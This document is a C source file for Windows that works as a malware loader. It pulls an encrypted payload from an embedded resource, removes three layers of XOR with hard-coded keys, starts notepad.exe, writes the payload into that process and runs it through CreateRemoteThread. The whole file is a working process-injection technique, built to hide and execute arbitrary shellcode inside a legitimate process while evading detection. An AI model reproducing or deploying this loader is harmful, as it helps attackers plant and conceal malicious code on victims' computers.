#include <Windows.h>
#include "resource.h"

typedef struct RsrcInfo {
	PVOID pWorkBuffer;
	SIZE_T sBufferSize;
}RsrcInfo;

RsrcInfo CloneRsrcPayload()
{
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	PVOID pPayload = LockResource(hGlobal);
	SIZE_T sPayloadSize = SizeofResource(NULL, hRsrc);
	PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);
	RsrcInfo ReturnInfo = { .pWorkBuffer = pWorkBuffer, .sBufferSize = sPayloadSize };
	return ReturnInfo;
}

int main()
{
	RsrcInfo sBufferInfo = CloneRsrcPayload();
	SIZE_T sPayloadSize = sBufferInfo.sBufferSize;
	PBYTE pPayload = sBufferInfo.pWorkBuffer;
BYTE pKey0[] = { 0xA9, 0x30, 0x73, 0x53, 0x26, 0x07, 0x43, 0x23, 0x39, 0x82, 0xFB, 0xC7, 0x2D, 0x4F, 0xDC, 0x8D, 0xDF, 0x65, 0x52, 0x40, 0xC5, 0xF5, 0x1C, 0xB5, 0x2F, 0x9D, 0xAD, 0xA1, 0xCD, 0xE0, 0xD2, 0xAD };
BYTE pIV0[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00 };
BYTE pKey1[] = { 0xCF, 0xED, 0xD3, 0x15, 0x5E, 0x85, 0x7B, 0x05, 0x14, 0x14, 0xFB, 0x43, 0x60, 0x60, 0xCA, 0xF9, 0x12, 0x03, 0xEE, 0xA5, 0x09, 0x79, 0xC2, 0xC7, 0x0B, 0x78, 0xF6, 0xDC, 0xF4, 0x7F, 0xD7, 0x90 };
BYTE pIV1[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00 };
BYTE pKey2[] = { 0x6D, 0x58, 0x5E, 0x2A, 0xA1, 0x5B, 0xBE, 0x0F, 0x21, 0x8E, 0x51, 0x19, 0xF9, 0x5A, 0x25, 0x2B, 0x57, 0xCE, 0x65, 0xD9, 0x47, 0x4D, 0x35, 0xC1, 0xC2, 0x84, 0xDE, 0x1E, 0xE7, 0x9F, 0x2B, 0x9A };
BYTE pIV2[] = { 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00 };
for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey2[j];
}

for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey1[j];
}

for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {
// if end of the key, start again 
	if (j >= 32)
	{
		j = 0;
	}
	pPayload[i] = pPayload[i] ^ pKey0[j];
}
LPCWSTR sProcessName = L"C:\\Windows\\System32\\notepad.exe";
STARTUPINFOW startup = { 0 };
PROCESS_INFORMATION procInfo = { 0 };

CreateProcessW(sProcessName, NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &procInfo);

DWORD iProcessId = procInfo.dwProcessId;
HANDLE hProcess = procInfo.hProcess;
LPVOID pProcess = VirtualAllocEx(hProcess, NULL, sPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
WriteProcessMemory(hProcess, pProcess, pPayload, sPayloadSize, NULL);
DWORD proc = 0;
VirtualProtectEx(hProcess, pProcess, sPayloadSize, PAGE_EXECUTE_READ, &proc);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pProcess, NULL, 0, NULL);
WaitForSingleObject(hThread, 2000);
return EXIT_SUCCESS;
}